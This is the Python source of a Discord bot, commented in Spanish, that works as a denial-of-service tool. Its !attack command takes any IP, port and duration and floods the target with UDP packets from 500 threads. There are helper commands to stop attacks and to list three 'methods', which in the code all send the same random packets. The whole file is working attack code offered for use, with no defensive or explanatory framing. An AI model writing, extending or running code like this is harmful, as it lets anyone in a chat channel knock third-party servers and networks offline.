import discord
import socket
import threading
import time
import random
from discord.ext import commands

# Configuración del bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Almacenará los ataques en curso
current_attacks = {}

# Función que envía un alto volumen de paquetes UDP
def send_udp_flood(target_ip, target_port, duration, stop_event, method):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    timeout = time.time() + duration

    while time.time() < timeout and not stop_event.is_set():
        try:
            for _ in range(10):
                if method == "UDP PPS":
                    sock.sendto(packet, (target_ip, int(target_port)))
                elif method == "DNS":
                    sock.sendto(packet, (target_ip, int(target_port)))
                elif method == "UDP-MIX":
                    sock.sendto(packet, (target_ip, int(target_port)))
        except Exception as e:
            print(f"Error al enviar paquete: {e}")
            break

    sock.close()

# Función para iniciar el ataque con múltiples hilos
def start_attack(target_ip, target_port, duration, thread_count, stop_event, method):
    threads = []
    
    for i in range(thread_count):
        thread = threading.Thread(target=send_udp_flood, args=(target_ip, target_port, duration, stop_event, method))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Comando para iniciar el ataque
@bot.command()
async def attack(ctx, ip: str, port: int, duration: int, method: str):
    if method not in ["UDP PPS", "DNS", "UDP-MIX"]:
        await ctx.send("⚠️ **Método inválido. Usa uno de los siguientes métodos: UDP PPS, DNS, UDP-MIX.**")
        return

    thread_count = 500  # Cantidad de hilos
    stop_event = threading.Event()  # Evento para detener el ataque
    current_attacks[ip] = stop_event

    # Crear un diseño visual en Discord usando formato YAML
    attack_message = (
        "```yaml\n"
        "# ===============================\n"
        "#         INICIANDO ATAQUE       \n"
        "# ===============================\n"
        f"IP:      {ip}\n"
        f"Port:    {port}\n"
        f"Time:    {duration}s\n"
        f"Type:    {method}\n"
        "# ===============================\n"
        "```"
    )

    await ctx.send(f"🚀 **Ataque UDP iniciado:**\n{attack_message}")
    
    # Iniciar el ataque en un hilo separado para no bloquear el bot
    threading.Thread(target=start_attack, args=(ip, port, duration, thread_count, stop_event, method)).start()
    await ctx.send("🔄 **Ataque en progreso...**")

# Comando para detener el ataque
@bot.command()
async def stop(ctx, ip: str):
    if ip in current_attacks:
        current_attacks[ip].set()  # Detener el evento
        del current_attacks[ip]    # Remover el ataque de la lista
        await ctx.send(f"🛑 **Ataque a {ip} detenido.**")
    else:
        await ctx.send(f"⚠️ **No hay ataques en curso para la IP {ip}.**")

# Comando para mostrar los comandos disponibles
@bot.command()
async def commands(ctx):
    commands_message = (
        "```yaml\n"
        "# ===============================\n"
        "#         COMANDOS DISPONIBLES   \n"
        "# ===============================\n"
        "1. !attack <ip> <port> <duration> <method> - Inicia un ataque UDP.\n"
        "2. !stop <ip> - Detiene un ataque en curso.\n"
        "3. !methods - Muestra los métodos de ataque disponibles.\n"
        "4. !commands - Muestra este mensaje de comandos.\n"
        "# ===============================\n"
        "```"
    )
    await ctx.send(commands_message)

# Comando para mostrar los métodos de ataque disponibles
@bot.command()
async def methods(ctx):
    methods_message = (
        "```yaml\n"
        "# ===============================\n"
        "#         MÉTODOS DE ATAQUE       \n"
        "# ===============================\n"
        "1. UDP PPS - Ataque UDP con alta tasa de paquetes por segundo.\n"
        "2. DNS - Ataque UDP que simula tráfico DNS.\n"
        "3. UDP-MIX - Ataque UDP con mezcla de paquetes.\n"
        "# ===============================\n"
        "```"
    )
    await ctx.send(methods_message)

# Evento que se ejecuta cuando el bot está listo
@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")

# Manejo de excepciones
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ **Error: Faltan argumentos en el comando.**")
    elif isinstance(error, commands.CommandInvokeError):
        await ctx.send("❌ **Error al ejecutar el comando.**")
    else:
        await ctx.send(f"❌ **Error: {error}**")

# Ejecutar el bot con tu token
bot.run('TU_TOKEN_DE_DISCORD')
